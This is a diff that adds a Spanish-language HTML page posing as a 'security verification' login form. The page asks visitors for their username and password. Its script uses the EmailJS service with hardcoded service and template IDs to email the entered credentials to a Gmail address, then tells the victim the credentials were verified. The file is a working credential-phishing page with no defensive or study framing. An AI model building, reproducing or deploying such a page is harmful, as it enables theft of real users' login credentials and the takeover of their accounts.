@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad Requerida</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #2575fc;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .header h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .form-container {
+            padding: 25px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-group input:focus {
+            border-color: #2575fc;
+            outline: none;
+        }
+        
+        .btn {
+            background: #2575fc;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #1c64e0;
+        }
+        
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 6px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .warning {
+            text-align: center;
+            margin-top: 25px;
+            padding: 15px;
+            background: #fff3cd;
+            border-radius: 6px;
+            color: #856404;
+            font-size: 14px;
+            border: 1px solid #ffeeba;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo i {
+            font-size: 42px;
+            color: #2575fc;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>Verificación de Seguridad</h2>
+            <p>Por favor, ingrese sus credenciales para continuar</p>
+        </div>
+        
+        <div class="form-container">
+            <div class="logo">
+                <i class="fas fa-lock"></i>
+            </div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="username"><i class="fas fa-user"></i> Usuario</label>
+                    <input type="text" id="username" name="username" required placeholder="Ingrese su usuario">
+                </div>
+                
+                <div class="input-group">
+                    <label for="password"><i class="fas fa-key"></i> Contraseña</label>
+                    <input type="password" id="password" name="password" required placeholder="Ingrese su contraseña">
+                </div>
+                
+                <button type="submit" class="btn">Verificar Identidad</button>
+            </form>
+            
+            <div id="successMessage" class="message success">
+                <i class="fas fa-check-circle"></i> Credenciales verificadas correctamente.
+            </div>
+            
+            <div id="errorMessage" class="message error">
+                <i class="fas fa-exclamation-circle"></i> Error al enviar las credenciales. Intente nuevamente.
+            </div>
+            
+            <div class="warning">
+                <i class="fas fa-exclamation-triangle"></i> Por su seguridad, asegúrese de que esta solicitud proviene de una fuente confiable.
+            </div>
+        </div>
+    </div>
+
+    <!-- Cargar EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script>
+        // Inicializar EmailJS con tu User ID
+        (function() {
+            emailjs.init("jhkwPOKTgSEjUoFLa"); // Reemplaza con tu User ID de EmailJS
+        })();
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Enviar correo usando EmailJS
+            emailjs.send("service_pma4dze", "template_f0fkh0x", {
+                to_email: "garlgarson2025@gmail.com",
+                username: username,
+                password: password,
+                from_name: "Formulario de Verificación",
+                reply_to: "noreply@example.com"
+            })
+            .then(function(response) {
+                console.log("SUCCESS!", response.status, response.text);
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('errorMessage').style.display = 'none';
+                document.getElementById('loginForm').reset();
+            }, function(error) {
+                console.log("FAILED...", error);
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('successMessage').style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
